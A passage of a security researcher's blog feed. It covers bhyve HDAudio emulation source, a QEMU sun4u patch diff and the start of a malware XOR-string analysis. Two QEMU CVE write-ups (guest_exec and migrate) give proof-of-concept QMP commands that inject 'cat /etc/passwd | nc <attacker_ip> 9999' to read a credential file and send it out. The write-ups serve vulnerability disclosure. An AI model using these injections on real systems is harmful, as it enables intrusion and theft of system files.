 	strm = (sdctl &amp;gt;&amp;gt; 20) &amp;amp; 0x0f;
 	dir = stream_ind &amp;gt;= HDA_ISS_NO;
 
 	DPRINTF(&quot;strm: 0x%x, dir: 0x%x\n&quot;, strm, dir);
 
 	sc-&amp;gt;stream_map[dir][strm] = stream_ind;
 	st-&amp;gt;stream = strm;
 	st-&amp;gt;dir = dir;
 	st-&amp;gt;bp = 0;
 	st-&amp;gt;be = 0;
 
 	hda_set_pib(sc, stream_ind, 0);
 
 	st-&amp;gt;run = 1;
 
 	hda_notify_codecs(sc, 1, strm, dir);
 
 	return (0);
 }
 
 static int
 hda_stream_stop(struct hda_softc *sc, uint8_t stream_ind)
 {
 	struct hda_stream_desc *st = &amp;amp;sc-&amp;gt;streams[stream_ind];
 	uint8_t strm = st-&amp;gt;stream;
 	uint8_t dir = st-&amp;gt;dir;
 
 	DPRINTF(&quot;stream: 0x%x, strm: 0x%x, dir: 0x%x\n&quot;, stream_ind, strm, dir);
 
 	st-&amp;gt;run = 0;
 
 	hda_notify_codecs(sc, 0, strm, dir);
 
 	return (0);
 }
 
 static uint32_t
 hda_read(struct hda_softc *sc, uint32_t offset)
 {
 	if (offset == HDAC_WALCLK)
 		return (24 * (hda_get_clock_ns() -			\
 			sc-&amp;gt;wall_clock_start) / 1000);
 
 	return (hda_get_reg_by_offset(sc, offset));
 }
 
 static int
 hda_write(struct hda_softc *sc, uint32_t offset, uint8_t size, uint32_t value)
 {
 	uint32_t old = hda_get_reg_by_offset(sc, offset);
 	uint32_t masks[] = {0x00000000, 0x000000ff, 0x0000ffff,
 			0x00ffffff, 0xffffffff};
 	hda_set_reg_handler set_reg_handler = hda_set_reg_table[offset];
 
 	hda_set_field_by_offset(sc, offset, masks[size], value);
 
 	if (set_reg_handler)
 		set_reg_handler(sc, offset, old);
 
 	return (0);
 }
 
 static inline void
 hda_print_cmd_ctl_data(struct hda_codec_cmd_ctl *p)
 {
 #if DEBUG_HDA == 1
 	char *name = p-&amp;gt;name;
 #endif
 	DPRINTF(&quot;%s size: %d\n&quot;, name, p-&amp;gt;size);
 	DPRINTF(&quot;%s dma_vaddr: %p\n&quot;, name, p-&amp;gt;dma_vaddr);
 	DPRINTF(&quot;%s wp: 0x%x\n&quot;, name, p-&amp;gt;wp);
 	DPRINTF(&quot;%s rp: 0x%x\n&quot;, name, p-&amp;gt;rp);
 }
 
 static int
 hda_corb_start(struct hda_softc *sc)
 {
 	struct hda_codec_cmd_ctl *corb = &amp;amp;sc-&amp;gt;corb;
 	uint8_t corbsize = 0;
 	uint64_t corblbase = 0;
 	uint64_t corbubase = 0;
 	uint64_t corbpaddr = 0;
 
 	corb-&amp;gt;name = &quot;CORB&quot;;
 
 	corbsize = hda_get_reg_by_offset(sc, HDAC_CORBSIZE) &amp;amp;		\
 		   HDAC_CORBSIZE_CORBSIZE_MASK;
 	corb-&amp;gt;size = hda_corb_sizes[corbsize];
 
 	if (!corb-&amp;gt;size) {
 		DPRINTF(&quot;Invalid corb size\n&quot;);
 		return (-1);
 	}
 
 	corblbase = hda_get_reg_by_offset(sc, HDAC_CORBLBASE);
 	corbubase = hda_get_reg_by_offset(sc, HDAC_CORBUBASE);
 
 	corbpaddr = corblbase | (corbubase &amp;lt;&amp;lt; 32);
 	DPRINTF(&quot;CORB dma_paddr: %p\n&quot;, (void *)corbpaddr);
 
 	corb-&amp;gt;dma_vaddr = hda_dma_get_vaddr(sc, corbpaddr,
 			HDA_CORB_ENTRY_LEN * corb-&amp;gt;size);
 	if (!corb-&amp;gt;dma_vaddr) {
 		DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
 		return (-1);
 	}
 
 	corb-&amp;gt;wp = hda_get_reg_by_offset(sc, HDAC_CORBWP);
 	corb-&amp;gt;rp = hda_get_reg_by_offset(sc, HDAC_CORBRP);
 
 	corb-&amp;gt;run = 1;
 
 	hda_print_cmd_ctl_data(corb);
 
 	return (0);
 }
 
 static int
 hda_corb_run(struct hda_softc *sc)
 {
 	struct hda_codec_cmd_ctl *corb = &amp;amp;sc-&amp;gt;corb;
 	uint32_t verb = 0;
 	int err;
 
 	corb-&amp;gt;wp = hda_get_reg_by_offset(sc, HDAC_CORBWP);
 
 	while (corb-&amp;gt;rp != corb-&amp;gt;wp &amp;amp;&amp;amp; corb-&amp;gt;run) {
 		corb-&amp;gt;rp++;
 		corb-&amp;gt;rp %= corb-&amp;gt;size;
 
 		verb = hda_dma_ld_dword(corb-&amp;gt;dma_vaddr +		\
 				HDA_CORB_ENTRY_LEN * corb-&amp;gt;rp);
 
 		err = hda_send_command(sc, verb);
 		assert(!err);
 	}
 
 	hda_set_reg_by_offset(sc, HDAC_CORBRP, corb-&amp;gt;rp);
 
 	if (corb-&amp;gt;run)
 		hda_response_interrupt(sc);
 
 	return (0);
 }
 
 static int
 hda_rirb_start(struct hda_softc *sc)
 {
 	struct hda_codec_cmd_ctl *rirb = &amp;amp;sc-&amp;gt;rirb;
 	uint8_t rirbsize = 0;
 	uint64_t rirblbase = 0;
 	uint64_t rirbubase = 0;
 	uint64_t rirbpaddr = 0;
 
 	rirb-&amp;gt;name = &quot;RIRB&quot;;
 
 	rirbsize = hda_get_reg_by_offset(sc, HDAC_RIRBSIZE) &amp;amp;		\
 		   HDAC_RIRBSIZE_RIRBSIZE_MASK;
 	rirb-&amp;gt;size = hda_rirb_sizes[rirbsize];
 
 	if (!rirb-&amp;gt;size) {
 		DPRINTF(&quot;Invalid rirb size\n&quot;);
 		return (-1);
 	}
 
 	rirblbase = hda_get_reg_by_offset(sc, HDAC_RIRBLBASE);
 	rirbubase = hda_get_reg_by_offset(sc, HDAC_RIRBUBASE);
 
 	rirbpaddr = rirblbase | (rirbubase &amp;lt;&amp;lt; 32);
 	DPRINTF(&quot;RIRB dma_paddr: %p\n&quot;, (void *)rirbpaddr);
 
 	rirb-&amp;gt;dma_vaddr = hda_dma_get_vaddr(sc, rirbpaddr,
 			HDA_RIRB_ENTRY_LEN * rirb-&amp;gt;size);
 	if (!rirb-&amp;gt;dma_vaddr) {
 		DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
 		return (-1);
 	}
 
 	rirb-&amp;gt;wp = hda_get_reg_by_offset(sc, HDAC_RIRBWP);
 	rirb-&amp;gt;rp = 0x0000;
 
 	rirb-&amp;gt;run = 1;
 
 	hda_print_cmd_ctl_data(rirb);
 
 	return (0);
 }
 
 static void *
 hda_dma_get_vaddr(struct hda_softc *sc, uint64_t dma_paddr, size_t len)
 {
 	struct pci_devinst *pi = sc-&amp;gt;pci_dev;
 
 	assert(pi);
 
 	return (paddr_guest2host(pi-&amp;gt;pi_vmctx, (uintptr_t)dma_paddr, len));
 }
 
 static void
 hda_dma_st_dword(void *dma_vaddr, uint32_t data)
 {
 	*(uint32_t*)dma_vaddr = data;
 }
 
 static uint32_t
 hda_dma_ld_dword(void *dma_vaddr)
 {
 	return (*(uint32_t*)dma_vaddr);
 }
 
 static inline uint8_t
 hda_get_stream_by_offsets(uint32_t offset, uint8_t reg_offset)
 {
 	uint8_t stream_ind = (offset - reg_offset) &amp;gt;&amp;gt; 5;
 
 	assert(stream_ind &amp;lt; HDA_IOSS_NO);
 
 	return (stream_ind);
 }
 
 static inline uint32_t
 hda_get_offset_stream(uint8_t stream_ind)
 {
 	return (stream_ind &amp;lt;&amp;lt; 5);
 }
 
 static void
 hda_set_gctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 
 	if (!(value &amp;amp; HDAC_GCTL_CRST)) {
 		hda_reset(sc);
 	}
 }
 
 static void
 hda_set_statests(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 
 	hda_set_reg_by_offset(sc, offset, old);
 
 	/* clear the corresponding bits written by the software (guest) */
 	hda_set_field_by_offset(sc, offset, value &amp;amp; HDA_STATESTS_IRQ_MASK, 0);
 
 	hda_update_intr(sc);
 }
 
 static void
 hda_set_corbwp(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	hda_corb_run(sc);
 }
 
 static void
 hda_set_corbctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 	int err;
 	struct hda_codec_cmd_ctl *corb = NULL;
 
 	if (value &amp;amp; HDAC_CORBCTL_CORBRUN) {
 		if (!(old &amp;amp; HDAC_CORBCTL_CORBRUN)) {
 			err = hda_corb_start(sc);
 			assert(!err);
 		}
 	} else {
 		corb = &amp;amp;sc-&amp;gt;corb;
 		memset(corb, 0, sizeof(*corb));
 	}
 
 	hda_corb_run(sc);
 }
 
 static void
 hda_set_rirbctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 	int err;
 	struct hda_codec_cmd_ctl *rirb = NULL;
 
 	if (value &amp;amp; HDAC_RIRBCTL_RIRBDMAEN) {
 		err = hda_rirb_start(sc);
 		assert(!err);
 	} else {
 		rirb = &amp;amp;sc-&amp;gt;rirb;
 		memset(rirb, 0, sizeof(*rirb));
 	}
 }
 
 static void
 hda_set_rirbsts(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 
 	hda_set_reg_by_offset(sc, offset, old);
 
 	/* clear the corresponding bits written by the software (guest) */
 	hda_set_field_by_offset(sc, offset, value &amp;amp; HDA_RIRBSTS_IRQ_MASK, 0);
 
 	hda_update_intr(sc);
 }
 
 static void
 hda_set_dpiblbase(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 	uint64_t dpiblbase = 0;
 	uint64_t dpibubase = 0;
 	uint64_t dpibpaddr = 0;
 
 	if ((value &amp;amp; HDAC_DPLBASE_DPLBASE_DMAPBE) != (old &amp;amp;		\
 				HDAC_DPLBASE_DPLBASE_DMAPBE)) {
 		if (value &amp;amp; HDAC_DPLBASE_DPLBASE_DMAPBE) {
 			dpiblbase = value &amp;amp; HDAC_DPLBASE_DPLBASE_MASK;
 			dpibubase = hda_get_reg_by_offset(sc, HDAC_DPIBUBASE);
 
 			dpibpaddr = dpiblbase | (dpibubase &amp;lt;&amp;lt; 32);
 			DPRINTF(&quot;DMA Position In Buffer dma_paddr: %p\n&quot;,
 			    (void *)dpibpaddr);
 
 			sc-&amp;gt;dma_pib_vaddr = hda_dma_get_vaddr(sc, dpibpaddr,
 					HDA_DMA_PIB_ENTRY_LEN * HDA_IOSS_NO);
 			if (!sc-&amp;gt;dma_pib_vaddr) {
 				DPRINTF(&quot;Fail to get the guest \
 					 virtual address\n&quot;);
 				assert(0);
 			}
 		} else {
 			DPRINTF(&quot;DMA Position In Buffer Reset\n&quot;);
 			sc-&amp;gt;dma_pib_vaddr = NULL;
 		}
 	}
 }
 
 static void
 hda_set_sdctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint8_t stream_ind = hda_get_stream_by_offsets(offset, HDAC_SDCTL0);
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 	int err;
 
 	DPRINTF(&quot;stream_ind: 0x%x old: 0x%x value: 0x%x\n&quot;,
 	    stream_ind, old, value);
 
 	if (value &amp;amp; HDAC_SDCTL_SRST) {
 		hda_stream_reset(sc, stream_ind);
 	}
 
 	if ((value &amp;amp; HDAC_SDCTL_RUN) != (old &amp;amp; HDAC_SDCTL_RUN)) {
 		if (value &amp;amp; HDAC_SDCTL_RUN) {
 			err = hda_stream_start(sc, stream_ind);
 			assert(!err);
 		} else {
 			err = hda_stream_stop(sc, stream_ind);
 			assert(!err);
 		}
 	}
 }
 
 static void
 hda_set_sdctl2(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 
 	hda_set_field_by_offset(sc, offset - 2, 0x00ff0000, value &amp;lt;&amp;lt; 16);
 }
 
 static void
 hda_set_sdsts(struct hda_softc *sc, uint32_t offset, uint32_t old)
 {
 	uint32_t value = hda_get_reg_by_offset(sc, offset);
 
 	hda_set_reg_by_offset(sc, offset, old);
 
 	/* clear the corresponding bits written by the software (guest) */
 	hda_set_field_by_offset(sc, offset, value &amp;amp; HDA_SDSTS_IRQ_MASK, 0);
 
 	hda_update_intr(sc);
 }
 
 static int
 hda_signal_state_change(struct hda_codec_inst *hci)
 {
 	struct hda_softc *sc = NULL;
 	uint32_t sdiwake = 0;
 
 	assert(hci);
 	assert(hci-&amp;gt;hda);
 
 	DPRINTF(&quot;cad: 0x%x\n&quot;, hci-&amp;gt;cad);
 
 	sc = hci-&amp;gt;hda;
 	sdiwake = 1 &amp;lt;&amp;lt; hci-&amp;gt;cad;
 
 	hda_set_field_by_offset(sc, HDAC_STATESTS, sdiwake, sdiwake);
 	hda_update_intr(sc);
 
 	return (0);
 }
 
 static int
 hda_response(struct hda_codec_inst *hci, uint32_t response, uint8_t unsol)
 {
 	struct hda_softc *sc = NULL;
 	struct hda_codec_cmd_ctl *rirb = NULL;
 	uint32_t response_ex = 0;
 	uint8_t rintcnt = 0;
 
 	assert(hci);
 	assert(hci-&amp;gt;cad &amp;lt;= HDA_CODEC_MAX);
 
 	response_ex = hci-&amp;gt;cad | unsol;
 
 	sc = hci-&amp;gt;hda;
 	assert(sc);
 
 	rirb = &amp;amp;sc-&amp;gt;rirb;
 
 	if (rirb-&amp;gt;run) {
 		rirb-&amp;gt;wp++;
 		rirb-&amp;gt;wp %= rirb-&amp;gt;size;
 
 		hda_dma_st_dword(rirb-&amp;gt;dma_vaddr + HDA_RIRB_ENTRY_LEN *	\
 				rirb-&amp;gt;wp, response);
 		hda_dma_st_dword(rirb-&amp;gt;dma_vaddr + HDA_RIRB_ENTRY_LEN *	\
 				rirb-&amp;gt;wp + 0x04, response_ex);
 
 		hda_set_reg_by_offset(sc, HDAC_RIRBWP, rirb-&amp;gt;wp);
 
 		sc-&amp;gt;rirb_cnt++;
 	}
 
 	rintcnt = hda_get_reg_by_offset(sc, HDAC_RINTCNT);
 	if (sc-&amp;gt;rirb_cnt == rintcnt)
 		hda_response_interrupt(sc);
 
 	return (0);
 }
 
 static int
 hda_transfer(struct hda_codec_inst *hci, uint8_t stream, uint8_t dir,
     void *buf, size_t count)
 {
 	struct hda_softc *sc = NULL;
 	struct hda_stream_desc *st = NULL;
 	struct hda_bdle_desc *bdl = NULL;
 	struct hda_bdle_desc *bdle_desc = NULL;
 	uint8_t stream_ind = 0;
 	uint32_t lpib = 0;
 	uint32_t off = 0;
 	size_t left = 0;
 	uint8_t irq = 0;
 
 	assert(hci);
 	assert(hci-&amp;gt;hda);
 	assert(buf);
 	assert(!(count % HDA_DMA_ACCESS_LEN));
 
 	if (!stream) {
 		DPRINTF(&quot;Invalid stream\n&quot;);
 		return (-1);
 	}
 
 	sc = hci-&amp;gt;hda;
 
 	assert(stream &amp;lt; HDA_STREAM_TAGS_CNT);
 	stream_ind = sc-&amp;gt;stream_map[dir][stream];
 
 	if (!dir)
 		assert(stream_ind &amp;lt; HDA_ISS_NO);
 	else
 		assert(stream_ind &amp;gt;= HDA_ISS_NO &amp;amp;&amp;amp; stream_ind &amp;lt; HDA_IOSS_NO);
 
 	st = &amp;amp;sc-&amp;gt;streams[stream_ind];
 	if (!st-&amp;gt;run) {
 		DPRINTF(&quot;Stream 0x%x stopped\n&quot;, stream);
 		return (-1);
 	}
 
 	assert(st-&amp;gt;stream == stream);
 
 	off = hda_get_offset_stream(stream_ind);
 
 	lpib = hda_get_reg_by_offset(sc, off + HDAC_SDLPIB);
 
 	bdl = st-&amp;gt;bdl;
 
 	assert(st-&amp;gt;be &amp;lt; st-&amp;gt;bdl_cnt);
 	assert(st-&amp;gt;bp &amp;lt; bdl[st-&amp;gt;be].len);
 
 	left = count;
 	while (left) {
 		bdle_desc = &amp;amp;bdl[st-&amp;gt;be];
 
 		if (dir)
 			*(uint32_t *)buf =				\
 			    hda_dma_ld_dword(bdle_desc-&amp;gt;addr + st-&amp;gt;bp);
 		else
 			hda_dma_st_dword(bdle_desc-&amp;gt;addr + st-&amp;gt;bp,
 					*(uint32_t *)buf);
 
 		buf += HDA_DMA_ACCESS_LEN;
 		st-&amp;gt;bp += HDA_DMA_ACCESS_LEN;
 		lpib += HDA_DMA_ACCESS_LEN;
 		left -= HDA_DMA_ACCESS_LEN;
 
 		if (st-&amp;gt;bp == bdle_desc-&amp;gt;len) {
 			st-&amp;gt;bp = 0;
 			if (bdle_desc-&amp;gt;ioc)
 				irq = 1;
 			st-&amp;gt;be++;
 			if (st-&amp;gt;be == st-&amp;gt;bdl_cnt) {
 				st-&amp;gt;be = 0;
 				lpib = 0;
 			}
 			bdle_desc = &amp;amp;bdl[st-&amp;gt;be];
 		}
 	}
 
 	hda_set_pib(sc, stream_ind, lpib);
 
 	if (irq) {
 		hda_set_field_by_offset(sc, off + HDAC_SDSTS,
 				HDAC_SDSTS_BCIS, HDAC_SDSTS_BCIS);
 		hda_update_intr(sc);
 	}
 
 	return (0);
 }
 
 static void
 hda_set_pib(struct hda_softc *sc, uint8_t stream_ind, uint32_t pib)
 {
 	uint32_t off = hda_get_offset_stream(stream_ind);
 
 	hda_set_reg_by_offset(sc, off + HDAC_SDLPIB, pib);
 	/* LPIB Alias */
 	hda_set_reg_by_offset(sc, 0x2000 + off + HDAC_SDLPIB, pib);
 	if (sc-&amp;gt;dma_pib_vaddr)
 		*(uint32_t *)(sc-&amp;gt;dma_pib_vaddr + stream_ind *	\
 				HDA_DMA_PIB_ENTRY_LEN) = pib;
 }
 
 static uint64_t hda_get_clock_ns(void)
 {
 	struct timespec ts;
 	int err;
 
 	err = clock_gettime(CLOCK_MONOTONIC, &amp;amp;ts);
 	assert(!err);
 
 	return (ts.tv_sec * 1000000000LL + ts.tv_nsec);
 }
 
 /*
  * PCI HDA function definitions
  */
 static int
 pci_hda_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts)
 {
 	struct hda_softc *sc = NULL;
 
 	assert(ctx != NULL);
 	assert(pi != NULL);
 
 	pci_set_cfgdata16(pi, PCIR_VENDOR, INTEL_VENDORID);
 	pci_set_cfgdata16(pi, PCIR_DEVICE, HDA_INTEL_82801G);
 
 	pci_set_cfgdata8(pi, PCIR_SUBCLASS, PCIS_MULTIMEDIA_HDA);
 	pci_set_cfgdata8(pi, PCIR_CLASS, PCIC_MULTIMEDIA);
 
 	/* select the Intel HDA mode */
 	pci_set_cfgdata8(pi, PCIR_HDCTL, 0x01);
 
 	/* allocate one BAR register for the Memory address offsets */
 	pci_emul_alloc_bar(pi, 0, PCIBAR_MEM32, HDA_LAST_OFFSET);
 
 	/* allocate an IRQ pin for our slot */
 	pci_lintr_request(pi);
 
 	sc = hda_init(opts);
 	if (!sc)
 		return (-1);
 
 	sc-&amp;gt;pci_dev = pi;
 	pi-&amp;gt;pi_arg = sc;
 
 	return (0);
 }
 
 static void
 pci_hda_write(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
     int baridx, uint64_t offset, int size, uint64_t value)
 {
 	struct hda_softc *sc = pi-&amp;gt;pi_arg;
 	int err;
 
 	assert(sc);
 	assert(baridx == 0);
 	assert(size &amp;lt;= 4);
 
 	DPRINTF(&quot;offset: 0x%lx value: 0x%lx\n&quot;, offset, value);
 
 	err = hda_write(sc, offset, size, value);
 	assert(!err);
 }
 
 static uint64_t
 pci_hda_read(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
     int baridx, uint64_t offset, int size)
 {
 	struct hda_softc *sc = pi-&amp;gt;pi_arg;
 	uint64_t value = 0;
 
 	assert(sc);
 	assert(baridx == 0);
 	assert(size &amp;lt;= 4);
 
 	value = hda_read(sc, offset);
 
 	DPRINTF(&quot;offset: 0x%lx value: 0x%lx\n&quot;, offset, value);
 
 	return (value);
 }

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;https://wiki.freebsd.org/SummerOfCode2016/HDAudioEmulationForBhyve&lt;/li&gt;
  &lt;li&gt;https://svnweb.freebsd.org/base?view=revision&amp;amp;revision=349335&lt;/li&gt;
  &lt;li&gt;https://reviews.freebsd.org/rS349385&lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><summary type="html">On Jun 24, a new PCI HDAudio device model from the Google Summer of Code 2016 project was added into the BSD Hypervisor (bhyve) as part of its sound card emulation. I took a chance to look at the source code and found a trivial stack-based buffer overflow but unfortunately it is not exploitable in practice due to the limitation of bhyve’s arguments length. However, the code is patched just in case it is still going to be an issue in the future.</summary></entry><entry><title type="html">[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title><link href="http://localhost:4000/blog/CVE-2019-12929/" rel="alternate" type="text/html" title="[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution" /><published>2019-06-06T00:00:00+08:00</published><updated>2019-06-06T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-12929</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-12929/">&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;guest_exec&lt;/code&gt; command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;

&lt;p&gt;1st, execute the QEMU Guest Agent service&lt;br /&gt;
2nd, open another console and setup a listener to port 9999&lt;br /&gt;
3rd, connect to the target and enter the following commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{'execute':'guest-exec','arguments':{'path':'/bin/bash','arg': ['-c', 'cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999']}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">The QMP guest_exec command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.</summary></entry><entry><title type="html">[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution</title><link href="http://localhost:4000/blog/CVE-2019-12928/" rel="alternate" type="text/html" title="[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution" /><published>2019-06-05T00:00:00+08:00</published><updated>2019-06-05T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-12928</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-12928/">&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt; command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;

&lt;p&gt;1st, execute the QEMU with &lt;code class=&quot;highlighter-rouge&quot;&gt;-qmp tcp:&amp;lt;ip_address&amp;gt;:1234,server,nowait&lt;/code&gt;&lt;br /&gt;
2nd, open another console and setup a listener to port 9999&lt;br /&gt;
3rd, connect to the target and enter the following commands:&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ &quot;execute&quot;: &quot;qmp_capabilities&quot; }
{&quot;return&quot;: {}}
{ &quot;execute&quot;: &quot;migrate&quot;, &quot;arguments&quot;: { &quot;uri&quot;: &quot;exec:cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999&quot; } }
{&quot;return&quot;: {}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">The QMP migrate command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.</summary></entry><entry><title type="html">[CVE-2019-5008] QEMU sun4u Denial of Service</title><link href="http://localhost:4000/blog/CVE-2019-5008/" rel="alternate" type="text/html" title="[CVE-2019-5008] QEMU sun4u Denial of Service" /><published>2019-01-03T00:00:00+08:00</published><updated>2019-01-03T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-5008</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-5008/">&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.&lt;/p&gt;

&lt;p&gt;Patch diff:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/hw/sparc64/sun4u.c b/hw/sparc64/sun4u.c
index f76b19e4e9..5772da02cb 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/hw/sparc64/sun4u.c
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/hw/sparc64/sun4u.c
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -214,6 +214,11 @@&lt;/span&gt;  typedef struct PowerDevice {
 } PowerDevice;

 /* Power */
&lt;span class=&quot;gi&quot;&gt;+static uint64_t power_mem_read(void *opaque, hwaddr addr, unsigned size)
+{
+    return 0;
+}
+
&lt;/span&gt; static void power_mem_write(void *opaque, hwaddr addr,
                             uint64_t val, unsigned size)
 {
&lt;span class=&quot;p&quot;&gt;@@ -224,6 +229,7 @@&lt;/span&gt;  static void power_mem_write(void *opaque, hwaddr addr,
 }

 static const MemoryRegionOps power_mem_ops = {
&lt;span class=&quot;gi&quot;&gt;+    .read = power_mem_read,
&lt;/span&gt;     .write = power_mem_write,
     .endianness = DEVICE_NATIVE_ENDIAN,
     .valid = {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;https://lists.gnu.org/archive/html/qemu-devel/2019-01/msg00186.html&lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><summary type="html">QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.</summary></entry><entry><title type="html">3945ac76b591cdbd50515b9f65821a64</title><link href="http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/" rel="alternate" type="text/html" title="3945ac76b591cdbd50515b9f65821a64" /><published>2018-09-21T00:00:00+08:00</published><updated>2018-09-21T00:00:00+08:00</updated><id>http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64</id><content type="html" xml:base="http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/">&lt;p&gt;Upon decompiling, there is a subroutine called as &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt_code&lt;/code&gt;. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).&lt;/p&gt;

&lt;p&gt;key = BB2FA36AAA9541F0&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8049090 &amp;lt;encrypt_code+0&amp;gt;:    push    ebp {__saved_ebp}
0x8049091 &amp;lt;encrypt_code+1&amp;gt;:    mov     ebp, esp {__saved_ebp}
0x8049093 &amp;lt;encrypt_code+3&amp;gt;:    push    esi {__saved_esi}
0x8049094 &amp;lt;encrypt_code+4&amp;gt;:    mov     esi, dword [ebp+0xc {arg2}]
0x8049097 &amp;lt;encrypt_code+7&amp;gt;:    push    ebx {__saved_ebx}
0x8049098 &amp;lt;encrypt_code+8&amp;gt;:    mov     ebx, dword [ebp+0x8 {arg1}]
0x804909b &amp;lt;encrypt_code+11&amp;gt;:    test    esi, esi
0x804909d &amp;lt;encrypt_code+13&amp;gt;:    jle     0x80490c2
0x804909f &amp;lt;encrypt_code+15&amp;gt;:    xor     ecx, ecx  {0x0}
0x80490a1 &amp;lt;encrypt_code+17&amp;gt;:    mov     eax, ecx
0x80490a3 &amp;lt;encrypt_code+19&amp;gt;:    sar     eax, 0x1f
0x80490a6 &amp;lt;encrypt_code+22&amp;gt;:    shr     eax, 0x1c
0x80490a9 &amp;lt;encrypt_code+25&amp;gt;:    lea     edx, [ecx+eax]
0x80490ac &amp;lt;encrypt_code+28&amp;gt;:    and     edx, 0xf
0x80490af &amp;lt;encrypt_code+31&amp;gt;:    sub     edx, eax
0x80490b1 &amp;lt;encrypt_code+33&amp;gt;:    movzx   eax, byte [edx+xorkeys]
0x80490b8 &amp;lt;encrypt_code+40&amp;gt;:    xor     byte [ecx+ebx], al
0x80490bb &amp;lt;encrypt_code+43&amp;gt;:    add     ecx, 0x1
0x80490be &amp;lt;encrypt_code+46&amp;gt;:    cmp     ecx, esi
0x80490c0 &amp;lt;encrypt_code+48&amp;gt;:    jne     0x80490a1
0x80490c2 &amp;lt;encrypt_code+50&amp;gt;:    mov     eax, ebx
0x80490c4 &amp;lt;encrypt_code+52&amp;gt;:    pop     ebx {__saved_ebx}
0x80490c5 &amp;lt;encrypt_code+53&amp;gt;:    pop     esi {__saved_esi}
0x80490c6 &amp;lt;encrypt_code+54&amp;gt;:    pop     ebp {__saved_ebp}
0x80490c7 &amp;lt;encrypt_code+55&amp;gt;:    retn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Some of the encrypted strings:&lt;/p&gt;

